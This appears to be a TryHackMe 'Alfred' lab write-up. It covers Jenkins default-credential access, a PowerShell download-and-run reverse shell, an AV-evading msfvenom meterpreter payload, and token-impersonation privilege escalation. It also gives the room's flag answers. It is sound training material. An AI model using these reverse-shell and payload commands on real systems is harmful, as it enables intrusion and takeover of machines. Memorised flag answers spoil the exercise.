# Alfred — TryHackMe

<p align="left">
  <img src="./assets/alfred/00-card.png" alt="Alfred machine card" width="650">
</p>

Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

## **Initial Access**

![Alfred](./assets/alfred/alfred-2.png)

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made changes to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.  

###### Answer the questions below

How many ports are open? (TCP only)  
3

![alfred scan](./assets/alfred/alfred-scan.png)

What is the username and password for the login panel? (in the format username:password)
admin:admin

![alfred port 80](./assets/alfred/alfred-port-80.png)
![alfred port 8080](./assets/alfred/alfred-port-8080.png)
![alfred admin login](./assets/alfred/alfred-admin-login.png)

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: _powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_

You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: _python3 -m http.server_

![alfred configure](./assets/alfred/alfred-configure.png)
![alfred reverse shell upload](./assets/alfred/alfred-reverse-shell-upload.png)
![alfred reverse shell send](./assets/alfred/alfred-reverse-shell-send.png)

What is the user.txt flag?
79007a09481963edf2e1321abd9ae2a0

![alfred listener + userflag](./assets/alfred/alfred-listener-userflag.png)


## **Switching Shells**

![mfs](./assets/alfred/mfs.png)

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create a Windows meterpreter reverse shell using the following payload:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`  

This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"`

Before running this program, ensure the handler is set up in Metasploit:

==`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`==  

﻿This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell

`Start-Process "shell-name.exe"`

This should spawn a meterpreter shell for you!  

###### Answer the questions below

What is the final size of the exe payload that you generated?
73802

![alfred msfvenom](./assets/alfred/alfred-msfvenom.png)
![alfred payload download](./assets/alfred/alfred-payload-download.png)
![alfred metasploit listener](./assets/alfred/alfred-metasploit-listener.png)
![alfred meterpreter privs](./assets/alfred/alfred-meterpreter-privs.png)


## **Privilege Escalation**

![jenkins](./assets/alfred/jenkins.png)

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

- User SIDs(security identifier)
- Group SIDs
- Privileges

Amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

- Primary access tokens: those associated with a user account that are generated on log on
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

Where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

###### Answer the questions below

View all the privileges using whoami /priv

![alfred meterpreter privs](./assets/alfred/alfred-meterpreter-privs.png)


You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability.

Enter: _load incognito_ to load the incognito module in Metasploit. Please note that you may need to use the _use incognito_ command if the previous command doesn't work. Also, ensure that your Metasploit is up to date.

![load incognito](./assets/alfred/load-incognito.png)

To check which tokens are available, enter the _list_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available.

![list tokens -g](./assets/alfred/list-tokens-g.png)

Use the _impersonate_token "BUILTIN\Administrators"_ command to impersonate the Administrators' token. What is the output when you run the _getuid_ command?

![user impersonate token](./assets/alfred/user-impersonate-token.png)


Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_

![ps services.exe](./assets/alfred/ps-services-exe.png)
![migrate services](./assets/alfred/migrate-services.png)

Read the root.txt file located at C:\Windows\System32\config
dff0f748678f280250f25a45b8046b4a

![root flag](./assets/alfred/root-flag.png)
---

**Live version:** [read this write-up on my blog](https://debasjan.github.io/writeups/alfred/)
